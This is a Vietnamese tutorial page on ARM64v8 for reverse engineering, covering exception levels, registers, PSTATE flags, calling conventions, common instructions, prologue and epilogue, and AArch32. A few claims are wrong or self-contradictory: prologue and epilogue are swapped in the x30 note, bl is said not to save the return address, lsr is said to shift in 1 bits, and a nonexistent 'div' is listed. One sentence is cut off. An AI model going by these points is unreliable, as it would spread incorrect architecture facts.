# Giới thiệu về ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Các mức ngoại lệ - EL (ARM64v8)**

Trong kiến trúc Armv8, các mức ngoại lệ (EL) xác định đặc quyền và môi trường thực thi. Kiến trúc định nghĩa bốn mức, từ EL0 đến EL3, mặc dù một hệ thống cụ thể không nhất thiết phải sử dụng mọi mức theo cách được mô tả trong ví dụ chung. <sup>[[5]](#references)</sup>

1. **EL0 - Chế độ người dùng**:
   - Đây là mức có ít đặc quyền nhất, dùng để thực thi mã ứng dụng thông thường.
   - Các ứng dụng chạy ở EL0 được cô lập với nhau và với phần mềm hệ thống, giúp tăng cường bảo mật và tính ổn định.
2. **EL1 - Chế độ nhân hệ điều hành**:
   - Hầu hết nhân hệ điều hành chạy ở mức này.
   - EL1 có nhiều đặc quyền hơn EL0 và có thể truy cập tài nguyên hệ thống, nhưng vẫn có một số hạn chế nhằm đảm bảo tính toàn vẹn của hệ thống. Có thể chuyển từ EL0 sang EL1 bằng lệnh SVC.
3. **EL2 - Chế độ hypervisor**:
   - Mức này được dùng cho ảo hóa. Một hypervisor chạy ở EL2 có thể quản lý nhiều hệ điều hành (mỗi hệ điều hành chạy ở EL1 riêng) trên cùng một phần cứng vật lý.
   - EL2 cung cấp các tính năng cô lập và kiểm soát môi trường ảo hóa.
   - Vì vậy, các ứng dụng máy ảo như Parallels có thể sử dụng `hypervisor.framework` để tương tác với EL2 và chạy máy ảo mà không cần kernel extensions.
   - Để chuyển từ EL1 sang EL2, dùng lệnh `HVC`.
4. **EL3 - Chế độ Secure Monitor**:
   - Đây là mức có nhiều đặc quyền nhất, thường được dùng cho secure boot và môi trường thực thi đáng tin cậy.
   - EL3 có thể quản lý và kiểm soát quyền truy cập giữa trạng thái bảo mật và không bảo mật (chẳng hạn như secure boot, trusted OS, v.v.).
   - Phần mềm yêu cầu chuyển sang secure monitor bằng lệnh `SMC` (Secure Monitor Call) khi giao diện này được triển khai.
   - Tài liệu cũ về bảo mật của Apple thường đề cập **Kernel Patch Protection (KPP)** cùng với cơ chế thực thi ở mức monitor có đặc quyền. Đây là bối cảnh lịch sử hữu ích, nhưng các khẳng định chung rằng Apple không còn dùng EL3 hoặc mọi nền tảng Apple đều triển khai KPP ở EL3 không thể áp dụng cho mọi thế hệ. Tài liệu hiện tại của Apple mô tả các cơ chế bảo vệ như Kernel Integrity Protection, System Coprocessor Integrity Protection, SPTM và TXM; hãy xác minh SoC và phiên bản OS đang phân tích. <sup>[[6]](#references)</sup>

Việc sử dụng các mức này tạo ra một cách có cấu trúc và an toàn để quản lý các khía cạnh khác nhau của hệ thống, từ ứng dụng người dùng đến phần mềm hệ thống có nhiều đặc quyền nhất. Cách tiếp cận của ARMv8 đối với các mức đặc quyền giúp cô lập hiệu quả các thành phần hệ thống khác nhau, qua đó tăng cường bảo mật và độ tin cậy của hệ thống.

## **Registers (ARM64v8)**

ARM64 có **31 register đa dụng**, được đặt tên từ `x0` đến `x30`. Mỗi register có thể lưu một giá trị **64-bit** (8 byte). Với các thao tác 32-bit, có thể truy cập cùng các register đó dưới tên `w0` đến `w30`. <sup>[[5]](#references)</sup>

1. **`x0`** đến **`x7`** - Các register này thường được dùng làm scratch register và để truyền tham số cho subroutine.
   - **`x0`** cũng chứa dữ liệu trả về của hàm.
2. **`x8`** - Trong Linux kernel, `x8` được dùng làm số system call cho lệnh `svc`. **Trong macOS, register được dùng là x16!**
3. **`x9`** đến **`x15`** - Các register tạm thời khác, thường dùng cho biến cục bộ.
4. **`x16`** và **`x17`** - **Intra-procedural Call Registers**. Các register tạm thời dùng cho giá trị tức thời. Chúng cũng được dùng cho các lời gọi hàm gián tiếp và PLT (Procedure Linkage Table) stub.
   - **`x16`** được dùng làm **số system call** cho lệnh **`svc`** trong **macOS**.
5. **`x18`** - **Platform register**. Có thể dùng làm register đa dụng, nhưng trên một số nền tảng, register này được dành riêng cho mục đích cụ thể của nền tảng: con trỏ đến thread environment block hiện tại trong Windows, hoặc con trỏ đến **cấu trúc task đang thực thi trong Linux kernel**.
6. **`x19`** đến **`x28`** - Đây là các callee-saved register. Hàm phải giữ nguyên giá trị của các register này để trả lại cho caller, vì vậy chúng được lưu trên stack và khôi phục trước khi quay lại caller.
7. **`x29`** - **Frame pointer** dùng để theo dõi stack frame. Khi tạo stack frame mới do một hàm được gọi, register **`x29`** được **lưu trên stack** và địa chỉ frame pointer **mới** (địa chỉ **`sp`**) được **lưu vào register này**.
   - Register này cũng có thể dùng làm **register đa dụng**, dù thường được dùng làm tham chiếu đến **biến cục bộ**.
8. **`x30`** hoặc **`lr`** - **Link register**. Register này giữ **địa chỉ trả về** khi thực thi lệnh `BL` (Branch with Link) hoặc `BLR` (Branch with Link to Register), bằng cách lưu giá trị **`pc`** vào register.
   - Nó cũng có thể được dùng như mọi register khác.
   - Nếu hàm hiện tại sắp gọi một hàm mới và do đó ghi đè `lr`, nó sẽ lưu `lr` lên stack ở đầu hàm. Đây là epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Lưu `fp` và `lr`, cấp phát vùng nhớ và lấy `fp` mới), rồi khôi phục `lr` ở cuối hàm. Đây là prologue (`ldp x29, x30, [sp], #48; ret` -> Khôi phục `fp` và `lr`, rồi quay về).
9. **`sp`** - **Stack pointer**, dùng để theo dõi đỉnh stack.
   - Giá trị **`sp`** luôn phải được giữ căn chỉnh tối thiểu theo **quadword**, nếu không có thể xảy ra lỗi căn chỉnh.
10. **`pc`** - **Program counter**, trỏ đến lệnh tiếp theo. Chỉ có thể cập nhật register này thông qua việc tạo ngoại lệ, trả về từ ngoại lệ và các lệnh branch. Các lệnh thông thường duy nhất có thể đọc register này là các lệnh branch with link (BL, BLR), dùng để lưu địa chỉ **`pc`** vào **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Còn được gọi là **`wzr`** ở dạng register **32**-bit. Có thể dùng để lấy giá trị 0 dễ dàng (một thao tác phổ biến) hoặc thực hiện so sánh bằng **`subs`**, chẳng hạn **`subs XZR, Xn, #10`**, trong đó dữ liệu kết quả không được lưu ở đâu (vào **`xzr`**).

Các register **`Wn`** là phiên bản **32-bit** của register **`Xn`**.

> [!TIP]
> Các register từ X0 đến X18 là volatile, nghĩa là lời gọi hàm và interrupt có thể thay đổi giá trị của chúng. Ngược lại, các register từ X19 đến X28 là non-volatile, nghĩa là giá trị của chúng phải được giữ nguyên qua các lời gọi hàm ("callee saved").

### Registers SIMD và dấu phẩy động

Ngoài ra còn có **32 register dài 128-bit**, có thể được dùng trong các thao tác single instruction multiple data (SIMD) được tối ưu hóa và để thực hiện phép toán dấu phẩy động. Chúng được gọi là các register Vn, nhưng cũng có thể hoạt động ở các độ rộng **64**-bit, **32**-bit, **16**-bit và **8**-bit; khi đó chúng được gọi là **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** và **`Bn`**.

### System Registers

**Có hàng trăm system register**, còn được gọi là special-purpose register (SPR), dùng để **giám sát** và **điều khiển** hoạt động của **processor**.\
Chỉ có thể đọc hoặc thiết lập chúng bằng các lệnh đặc biệt chuyên dụng **`mrs`** và **`msr`**.

Các register đặc biệt **`TPIDR_EL0`** và **`TPIDDR_EL0`** thường xuất hiện khi reverse engineering. Hậu tố `EL0` cho biết **mức ngoại lệ thấp nhất** có thể truy cập register (trong trường hợp này, EL0 là mức ngoại lệ (đặc quyền) thông thường mà các chương trình bình thường chạy ở đó).\
Chúng thường được dùng để lưu **địa chỉ cơ sở của vùng bộ nhớ thread-local storage**. Thông thường, chương trình chạy ở EL0 có thể đọc và ghi register đầu tiên, nhưng chỉ có thể đọc register thứ hai từ EL0; việc ghi cần thực hiện từ EL1 (chẳng hạn như kernel).

- `mrs x0, TPIDR_EL0 ; Đọc TPIDR_EL0 vào x0`
- `msr TPIDR_EL0, X0 ; Ghi x0 vào TPIDR_EL0`

### **PSTATE**

**PSTATE** chứa các trường trạng thái processor. Khi xảy ra ngoại lệ, trạng thái liên quan được lưu vào **`SPSR_ELx`**, trong đó `x` xác định mức ngoại lệ xử lý ngoại lệ đó, để có thể khôi phục trạng thái khi quay về.\
Các trường có thể truy cập gồm:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Các cờ điều kiện **`N`**, **`Z`**, **`C`** và **`V`**:
  - **`N`** nghĩa là thao tác cho ra kết quả âm.
  - **`Z`** nghĩa là thao tác cho ra kết quả bằng 0.
  - **`C`** nghĩa là thao tác tạo ra carry.
  - **`V`** nghĩa là thao tác tạo ra signed overflow:
    - Tổng của hai số dương cho ra kết quả âm.
    - Tổng của hai số âm cho ra kết quả dương.
    - Trong phép trừ, khi lấy một số âm lớn trừ một số dương nhỏ hơn (hoặc ngược lại) và kết quả không thể biểu diễn trong phạm vi của độ rộng bit đã cho.
    - Rõ ràng processor không biết thao tác là signed hay unsigned, vì vậy nó sẽ kiểm tra C và V trong các thao tác và cho biết có carry xảy ra hay không, trong trường hợp phép toán là signed hoặc unsigned.

> [!WARNING]
> Không phải mọi lệnh đều cập nhật các cờ này. Một số lệnh như **`CMP`** hoặc **`TST`** có cập nhật cờ; các lệnh khác có hậu tố s, chẳng hạn **`ADDS`**, cũng vậy.

- Cờ **độ rộng register hiện tại (`nRW`)**: Nếu cờ có giá trị 0, chương trình sẽ chạy ở trạng thái thực thi AArch64 sau khi được tiếp tục.
- **Mức ngoại lệ hiện tại** (**`EL`**): Một chương trình thông thường chạy ở EL0 sẽ có giá trị 0.
- Cờ **single stepping** (**`SS`**): Debugger dùng cờ này để thực hiện từng bước bằng cách đặt SS thành 1 trong **`SPSR_ELx`** thông qua một ngoại lệ. Chương trình sẽ chạy một bước rồi phát sinh ngoại lệ single step.
- Cờ trạng thái **ngoại lệ không hợp lệ** (**`IL`**): Cờ này dùng để đánh dấu khi phần mềm có đặc quyền thực hiện một lần chuyển mức ngoại lệ không hợp lệ; cờ được đặt thành 1 và processor kích hoạt ngoại lệ trạng thái không hợp lệ.
- Các cờ **`DAIF`**: Các cờ này cho phép chương trình có đặc quyền chọn lọc việc mask một số ngoại lệ bên ngoài.
  - Nếu **`A`** bằng 1, các **asynchronous abort** sẽ được kích hoạt. **`I`** cấu hình phản hồi với **Interrupt Request** (IRQ) từ phần cứng bên ngoài. **`F`** liên quan đến **Fast Interrupt Request** (FIR).
- Các cờ **chọn stack pointer** (**`SPS`**): Phần mềm có đặc quyền chạy ở EL1 trở lên có thể chuyển đổi giữa stack pointer riêng và stack pointer của user model (ví dụ giữa `SP_EL1` và `EL0`). Việc chuyển đổi này được thực hiện bằng cách ghi vào system register **`SPSel`**. EL0 không thể thực hiện thao tác này.

## **Calling Convention (ARM64v8)**

Calling convention của ARM64 quy định **tám tham số đầu tiên** của một hàm được truyền qua các register **`x0` đến `x7`**. Các tham số **còn lại** được truyền qua **stack**. Giá trị **trả về** được truyền trong register **`x0`**, hoặc cả **`x1`** nếu giá trị dài 128 bit. Các register **`x19`** đến **`x30`** và **`sp`** phải được **giữ nguyên** qua các lời gọi hàm.

Khi đọc một hàm trong assembly, hãy tìm **function prologue và epilogue**. **Prologue** thường bao gồm việc **lưu frame pointer (`x29`)**, **thiết lập** frame pointer **mới** và **cấp phát vùng nhớ trên stack**. **Epilogue** thường bao gồm việc **khôi phục frame pointer đã lưu** và **quay về** từ hàm.

### Calling Convention trong Swift

Swift có **calling convention** riêng, có thể tìm thấy tại [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Các lệnh thường dùng (ARM64v8)**

Các lệnh ARM64 thường có **định dạng `opcode dst, src1, src2`**, trong đó **`opcode`** là **thao tác** cần thực hiện (chẳng hạn `add`, `sub`, `mov`, v.v.), **`dst`** là register **đích** dùng để lưu kết quả, còn **`src1`** và **`src2`** là các register **nguồn**. Có thể dùng giá trị tức thời thay cho register nguồn.

- **`mov`**: **Di chuyển** một giá trị từ **register** này sang register khác.
  - Ví dụ: `mov x0, x1` — Lệnh này chuyển giá trị từ `x1` sang `x0`.
- **`ldr`**: **Nạp** một giá trị từ **bộ nhớ** vào **register**.
  - Ví dụ: `ldr x0, [x1]` — Lệnh này nạp giá trị từ vị trí bộ nhớ được `x1` trỏ tới vào `x0`.
  - **Chế độ offset**: Offset ảnh hưởng đến con trỏ gốc được chỉ định, ví dụ:
    - `ldr x2, [x1, #8]`, lệnh này nạp giá trị từ x1 + 8 vào x2.
    - `ldr x2, [x0, x1, lsl #2]`, lệnh này nạp vào x2 một phần tử từ mảng x0, tại vị trí x1 (index) \* 4.
  - **Chế độ pre-indexed**: Thực hiện phép tính trên địa chỉ gốc, lấy kết quả rồi lưu địa chỉ gốc mới vào register chứa địa chỉ gốc.
    - `ldr x2, [x1, #8]!`, lệnh này nạp `x1 + 8` vào `x2` và lưu kết quả `x1 + 8` vào x1.
    - `str lr, [sp, #-4]!`, Lưu link register vào sp và cập nhật register sp.
  - **Chế độ post-index**: Tương tự chế độ trên, nhưng địa chỉ bộ nhớ được truy cập trước, sau đó mới tính offset và lưu kết quả.
    - `ldr x0, [x1], #8`, nạp `x1` vào `x0` và cập nhật x1 thành `x1 + 8`.
  - **Định địa chỉ PC-relative**: Trong trường hợp này, địa chỉ cần nạp được tính tương đối với register PC.
    - `ldr x1, =_start`, Lệnh này nạp vào x1 địa chỉ bắt đầu của symbol `_start`, tính tương đối với PC hiện tại.
- **`str`**: **Lưu** một giá trị từ **register** vào **bộ nhớ**.
  - Ví dụ: `str x0, [x1]` — Lệnh này lưu giá trị trong `x0` vào vị trí bộ nhớ được `x1` trỏ tới.
- **`ldp`**: **Nạp một cặp register**. Lệnh này **nạp hai register** từ các vị trí **bộ nhớ liên tiếp**. Địa chỉ bộ nhớ thường được tạo bằng cách cộng một offset vào giá trị trong register khác.
  - Ví dụ: `ldp x0, x1, [x2]` — Lệnh này lần lượt nạp `x0` và `x1` từ các vị trí bộ nhớ tại `x2` và `x2 + 8`.
- **`stp`**: **Lưu một cặp register**. Lệnh này **lưu hai register** vào các vị trí **bộ nhớ liên tiếp**. Địa chỉ bộ nhớ thường được tạo bằng cách cộng một offset vào giá trị trong register khác.
  - Ví dụ: `stp x0, x1, [sp]` — Lệnh này lưu `x0` và `x1` vào các vị trí bộ nhớ tại `sp` và `sp + 8`.
  - `stp x0, x1, [sp, #16]!` — Lệnh này lưu `x0` và `x1` vào các vị trí bộ nhớ tại `sp+16` và `sp + 24`, đồng thời cập nhật `sp` thành `sp+16`.
- **`add`**: **Cộng** giá trị của hai register và lưu kết quả vào một register.
  - Cú pháp: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
    - Xn1 -> Đích
    - Xn2 -> Toán hạng 1
    - Xn3 | #imm -> Toán hạng 2 (register hoặc giá trị tức thời)
    - \[shift #N | RRX] -> Thực hiện phép dịch hoặc gọi RRX
  - Ví dụ: `add x0, x1, x2` — Lệnh này cộng giá trị trong `x1` và `x2`, rồi lưu kết quả vào `x0`.
  - `add x5, x5, #1, lsl #12` — Tương đương với 4096 (dịch 1 sang trái 12 lần) -> 1 0000 0000 0000 0000
  - **`adds`** Thực hiện `add` và cập nhật các cờ.
- **`sub`**: **Trừ** giá trị của hai register và lưu kết quả vào một register.
  - Xem **cú pháp** của **`add`**.
  - Ví dụ: `sub x0, x1, x2` — Lệnh này lấy giá trị trong `x2` trừ khỏi `x1`, rồi lưu kết quả vào `x0`.
  - **`subs`** Tương tự sub nhưng có cập nhật cờ.
- **`mul`**: **Nhân** giá trị của **hai register** và lưu kết quả vào một register.
  - Ví dụ: `mul x0, x1, x2` — Lệnh này nhân giá trị trong `x1` và `x2`, rồi lưu kết quả vào `x0`.
- **`div`**: **Chia** giá trị của một register cho register khác rồi lưu kết quả vào một register.
  - Ví dụ: `div x0, x1, x2` — Lệnh này chia giá trị trong `x1` cho `x2`, rồi lưu kết quả vào `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
  - **Dịch logic trái**: Thêm các bit 0 vào cuối, dịch các bit còn lại về phía trước (nhân với 2 lũy thừa n).
  - **Dịch logic phải**: Thêm các bit 1 ở đầu, dịch các bit còn lại về phía sau (chia cho 2 lũy thừa n với số unsigned).
  - **Dịch số học phải**: Tương tự **`lsr`**, nhưng thay vì thêm các bit 0, nếu bit có trọng số cao nhất là 1 thì sẽ thêm các bit **1** (chia cho 2 lũy thừa n với số signed).
  - **Xoay phải**: Tương tự **`lsr`**, nhưng các bit bị đẩy ra bên phải được nối vào bên trái.
  - **Xoay phải có mở rộng**: Tương tự **`ror`**, nhưng dùng cờ carry làm "bit có trọng số cao nhất". Cờ carry được chuyển đến bit 31 và bit bị đẩy ra được chuyển vào cờ carry.
- **`bfm`**: **Bit Field Move**, các thao tác này **sao chép các bit `0...n`** từ một giá trị và đặt chúng vào các vị trí **`m..m+n`**. **`#s`** chỉ vị trí **bit ngoài cùng bên trái**, còn **`#r`** chỉ lượng **xoay phải**.
  - Bitfield move: `BFM Xd, Xn, #r`
  - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
  - Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Trích xuất và chèn bitfield:** Sao chép một bitfield từ register này sang register khác.
  - **`BFI X1, X2, #3, #4`** Chèn 4 bit từ X2 vào X1, bắt đầu từ bit thứ 3.
  - **`BFXIL X1, X2, #3, #4`** Trích xuất 4 bit từ bit thứ 3 của X2 và sao chép chúng vào X1.
  - **`SBFIZ X1, X2, #3, #4`** Mở rộng dấu 4 bit từ X2 rồi chèn chúng vào X1, bắt đầu tại vị trí bit 3, đồng thời đặt các bit bên phải thành 0.
  - **`SBFX X1, X2, #3, #4`** Trích xuất 4 bit bắt đầu từ bit 3 của X2, mở rộng dấu rồi đặt kết quả vào X1.
  - **`UBFIZ X1, X2, #3, #4`** Mở rộng bằng 0 4 bit từ X2 rồi chèn chúng vào X1, bắt đầu tại vị trí bit 3, đồng thời đặt các bit bên phải thành 0.
  - **`UBFX X1, X2, #3, #4`** Trích xuất 4 bit bắt đầu từ bit 3 của X2 rồi đặt kết quả đã mở rộng bằng 0 vào X1.
- **Mở rộng dấu sang X:** Mở rộng dấu (hoặc chỉ thêm các bit 0 ở phiên bản unsigned) của một giá trị để có thể thực hiện các phép toán với giá trị đó:
  - **`SXTB X1, W2`** Mở rộng dấu của một byte **từ W2 sang X1** (`W2` bằng một nửa `X2`) để lấp đầy 64 bit.
  - **`SXTH X1, W2`** Mở rộng dấu của một số 16-bit **từ W2 sang X1** để lấp đầy 64 bit.
  - **`SXTW X1, W2`** Mở rộng dấu của một byte **từ W2 sang X1** để lấp đầy 64 bit.
  - **`UXTB X1, W2`** Thêm các bit 0 (unsigned) vào một byte **từ W2 sang X1** để lấp đầy 64 bit.
- **`extr`:** Trích xuất các bit từ **một cặp register được nối với nhau**.
  - Ví dụ: `EXTR W3, W2, W1, #3` Lệnh này sẽ **nối W1+W2**, lấy các bit **từ bit 3 của W2 đến bit 3 của W1** rồi lưu vào W3.
- **`cmp`**: **So sánh** hai register và thiết lập các cờ điều kiện. Đây là **bí danh của `subs`**, đặt register đích thành zero register. Hữu ích để kiểm tra `m == n`.
  - Lệnh này hỗ trợ **cùng cú pháp với `subs`**.
  - Ví dụ: `cmp x0, x1` — Lệnh này so sánh giá trị trong `x0` và `x1`, rồi thiết lập các cờ điều kiện tương ứng.
- **`cmn`**: **So sánh toán hạng âm**. Đây là **bí danh của `adds`** và có cùng cú pháp. Hữu ích để kiểm tra `m == -n`.
- **`ccmp`**: So sánh có điều kiện; phép so sánh chỉ được thực hiện nếu phép so sánh trước đó đúng và sẽ thiết lập cụ thể các bit nzcv.
  - `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> nếu x1 != x2 và x3 < x4 thì nhảy đến func
    - Lý do là **`ccmp`** chỉ được thực thi nếu **`cmp` trước đó cho kết quả `NE`**; nếu không, các bit `nzcv` sẽ được đặt thành 0 (khi đó phép so sánh `blt` sẽ không thỏa mãn).
    - Cũng có thể dùng lệnh này dưới dạng `ccmn` (tương tự nhưng là phép toán âm, như `cmp` và `cmn`).
- **`tst`**: Kiểm tra xem các giá trị được so sánh có bit nào cùng bằng 1 hay không (hoạt động như ANDS nhưng không lưu kết quả ở đâu). Hữu ích để kiểm tra một register với một giá trị nhằm xác định bit nào trong register được chỉ định bởi giá trị đó có bằng 1 hay không.
  - Ví dụ: `tst X1, #7` Kiểm tra xem 3 bit cuối của X1 có bit nào bằng 1 hay không.
- **`teq`**: Thực hiện phép XOR và loại bỏ kết quả.
- **`b`**: Branch vô điều kiện.
  - Ví dụ: `b myFunction`
  - Lưu ý rằng lệnh này không lưu địa chỉ trả về vào link register (không phù hợp với lời gọi subroutine cần quay về).
- **`bl`**: **Branch** có link, dùng để **gọi** một **subroutine**. Lưu **địa chỉ trả về vào `x30`**.
  - Ví dụ: `bl myFunction` — Lệnh này gọi hàm `myFunction` và lưu địa chỉ trả về vào `x30`.
  - Lưu ý rằng lệnh này không lưu địa chỉ trả về vào link register (không phù hợp với lời gọi subroutine cần quay về).
- **`blr`**: **Branch** có Link đến Register, dùng để **gọi** một **subroutine** có địa chỉ đích được **chỉ định** trong một **register**. Lưu địa chỉ trả về vào `x30`. (Đây là
  - Ví dụ: `blr x1` — Lệnh này gọi hàm có địa chỉ chứa trong `x1` và lưu địa chỉ trả về vào `x30`.
- **`ret`**: **Quay về** từ **subroutine**, thường dùng địa chỉ trong **`x30`**.
  - Ví dụ: `ret` — Lệnh này quay về từ subroutine hiện tại bằng địa chỉ trả về trong `x30`.
- **`b.<cond>`**: Branch có điều kiện.
  - **`b.eq`**: **Branch nếu bằng nhau**, dựa trên lệnh `cmp` trước đó.
    - Ví dụ: `b.eq label` — Nếu lệnh `cmp` trước đó xác định hai giá trị bằng nhau, lệnh này sẽ nhảy đến `label`.
  - **`b.ne`**: **Branch nếu không bằng nhau**. Lệnh này kiểm tra các cờ điều kiện (được thiết lập bởi lệnh so sánh trước đó); nếu các giá trị được so sánh không bằng nhau, lệnh sẽ nhảy đến một label hoặc địa chỉ.
    - Ví dụ: Sau lệnh `cmp x0, x1`, `b.ne label` — Nếu giá trị trong `x0` và `x1` không bằng nhau, lệnh này sẽ nhảy đến `label`.
- **`cbz`**: **So sánh và branch nếu bằng 0**. Lệnh này so sánh một register với 0; nếu chúng bằng nhau, lệnh sẽ nhảy đến một label hoặc địa chỉ.
  - Ví dụ: `cbz x0, label` — Nếu giá trị trong `x0` bằng 0, lệnh này sẽ nhảy đến `label`.
- **`cbnz`**: **So sánh và branch nếu khác 0**. Lệnh này so sánh một register với 0; nếu chúng không bằng nhau, lệnh sẽ nhảy đến một label hoặc địa chỉ.
  - Ví dụ: `cbnz x0, label` — Nếu giá trị trong `x0` khác 0, lệnh này sẽ nhảy đến `label`.
- **`tbnz`**: Kiểm tra bit và branch nếu khác 0.
  - Ví dụ: `tbnz x0, #8, label`
- **`tbz`**: Kiểm tra bit và branch nếu bằng 0.
  - Ví dụ: `tbz x0, #8, label`
- **Các thao tác conditional select**: Đây là các thao tác có hành vi thay đổi tùy theo các bit điều kiện.
  - `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Nếu đúng, X0 = X1; nếu sai, X0 = X2
  - `csinc Xd, Xn, Xm, cond` -> Nếu đúng, Xd = Xn; nếu sai, Xd = Xm + 1
  - `cinc Xd, Xn, cond` -> Nếu đúng, Xd = Xn + 1; nếu sai, Xd = Xn
  - `csinv Xd, Xn, Xm, cond` -> Nếu đúng, Xd = Xn; nếu sai, Xd = NOT(Xm)
  - `cinv Xd, Xn, cond` -> Nếu đúng, Xd = NOT(Xn); nếu sai, Xd = Xn
  - `csneg Xd, Xn, Xm, cond` -> Nếu đúng, Xd = Xn; nếu sai, Xd = - Xm
  - `cneg Xd, Xn, cond` -> Nếu đúng, Xd = - Xn; nếu sai, Xd = Xn
  - `cset Xd, Xn, Xm, cond` -> Nếu đúng, Xd = 1; nếu sai, Xd = 0
  - `csetm Xd, Xn, Xm, cond` -> Nếu đúng, Xd = \<tất cả bit bằng 1>; nếu sai, Xd = 0
- **`adrp`**: Tính **địa chỉ trang của một symbol** và lưu vào một register.
  - Ví dụ: `adrp x0, symbol` — Lệnh này tính địa chỉ trang của `symbol` và lưu vào `x0`.
- **`ldrsw`**: **Nạp** một giá trị **32-bit** có dấu từ bộ nhớ và **mở rộng dấu thành 64 bit**. Lệnh này thường được dùng trong các trường hợp SWITCH.
  - Ví dụ: `ldrsw x0, [x1]` — Lệnh này nạp một giá trị 32-bit có dấu từ vị trí bộ nhớ được `x1` trỏ tới, mở rộng dấu thành 64 bit rồi lưu vào `x0`.
- **`stur`**: **Lưu giá trị của một register vào vị trí bộ nhớ**, sử dụng offset tính từ một register khác.
  - Ví dụ: `stur x0, [x1, #4]` — Lệnh này lưu giá trị trong `x0` vào địa chỉ bộ nhớ cao hơn địa chỉ hiện tại trong `x1` 4 byte.
- **`svc`**: Thực hiện **system call**. Tên lệnh là viết tắt của "Supervisor Call". Khi processor thực thi lệnh này, nó **chuyển từ chế độ người dùng sang chế độ kernel** và nhảy đến một vị trí cụ thể trong bộ nhớ, nơi chứa mã **xử lý system call của kernel**.

  - Ví dụ:

    ```armasm
    mov x8, 93  ; Load the system call number for exit (93) into register x8.
    mov x0, 0   ; Load the exit status code (0) into register x0.
    svc 0       ; Make the system call.
    ```

### **Phần mở đầu hàm**

1. **Lưu thanh ghi liên kết và con trỏ khung vào ngăn xếp**:

```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```

2. **Thiết lập con trỏ khung mới**: `mov x29, sp` (thiết lập con trỏ khung mới cho hàm hiện tại)
3. **Cấp phát chỗ trên stack cho các biến cục bộ** (nếu cần): `sub sp, sp, <size>` (trong đó `<size>` là số byte cần thiết)

### **Phần kết thúc hàm**

1. **Giải phóng chỗ dành cho các biến cục bộ** (nếu đã cấp phát): `add sp, sp, <size>`
2. **Khôi phục thanh ghi liên kết và con trỏ khung**:

```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```

3. **Return**: `ret` (trả quyền điều khiển về caller bằng địa chỉ trong thanh ghi liên kết)

## Các cơ chế bảo vệ bộ nhớ phổ biến của ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Trạng thái thực thi AARCH32

Armv8-A hỗ trợ thực thi các chương trình 32-bit. **AArch32** có thể chạy với một trong **hai tập lệnh**: **`A32`** và **`T32`**, đồng thời có thể chuyển đổi giữa chúng thông qua **`interworking`**.\
Các chương trình 64-bit **có đặc quyền** có thể lên lịch **thực thi các chương trình 32-bit** bằng cách thực hiện chuyển mức ngoại lệ xuống chương trình 32-bit có đặc quyền thấp hơn.\
Lưu ý rằng quá trình chuyển từ 64-bit sang 32-bit diễn ra khi mức ngoại lệ giảm xuống (ví dụ: một chương trình 64-bit ở EL1 kích hoạt một chương trình ở EL0). Việc này được thực hiện bằng cách đặt **bit 4 của thanh ghi đặc biệt** **`SPSR_ELx`** thành **1** khi luồng của tiến trình `AArch32` sẵn sàng được thực thi; phần còn lại của `SPSR_ELx` lưu CPSR của chương trình **`AArch32`**. Sau đó, tiến trình có đặc quyền gọi lệnh **`ERET`** để bộ xử lý chuyển sang **`AArch32`**, bắt đầu ở A32 hoặc T32 tùy theo CPSR**.**

**`interworking`** diễn ra bằng cách sử dụng các bit J và T của CPSR. `J=0` và `T=0` tương ứng với **`A32`**, còn `J=0` và `T=1` tương ứng với **T32**. Nói cách khác, đặt **bit thấp nhất thành 1** để cho biết tập lệnh là T32.\
Việc này được thiết lập trong các **lệnh nhánh interworking**, nhưng cũng có thể được thiết lập trực tiếp bằng các lệnh khác khi PC được đặt làm thanh ghi đích. Ví dụ:

Một ví dụ khác:

```armasm
_start:
.code 32                ; Begin using A32
    add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
    bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
    mov r0, #0
    mov r0, #8
```

### Registers

Có 16 thanh ghi 32-bit (r0-r15). **Từ r0 đến r14**, chúng có thể được dùng cho **bất kỳ thao tác nào**, tuy nhiên một số thường được dành riêng:

- **`r15`**: Program counter (luôn luôn). Chứa địa chỉ của lệnh tiếp theo. Trong A32 là current + 8, trong T32 là current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Lưu ý stack luôn được căn chỉnh 16-byte)
- **`r14`**: Link Register

Ngoài ra, các thanh ghi được sao lưu trong **`banked registers`**. Đây là những nơi lưu trữ giá trị thanh ghi, cho phép **chuyển đổi ngữ cảnh nhanh** khi xử lý ngoại lệ và thực hiện các thao tác đặc quyền, tránh phải lưu và khôi phục thanh ghi thủ công mỗi lần.\
Việc này được thực hiện bằng cách **lưu trạng thái bộ xử lý từ `CPSR` vào `SPSR`** của chế độ bộ xử lý nhận ngoại lệ. Khi thoát khỏi ngoại lệ, **`CPSR`** được khôi phục từ **`SPSR`**.

### CPSR - Current Program Status Register

Trong AArch32, CPSR hoạt động tương tự **`PSTATE`** trong AArch64 và cũng được lưu vào **`SPSR_ELx`** khi xảy ra ngoại lệ để khôi phục trạng thái thực thi sau đó:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Các trường được chia thành một số nhóm:

- Application Program Status Register (APSR): Các cờ số học, có thể truy cập từ EL0
- Execution State Registers: Hành vi của tiến trình (do OS quản lý).

#### Application Program Status Register (APSR)

- Các cờ **`N`**, **`Z`**, **`C`**, **`V`** (giống như trong AArch64)
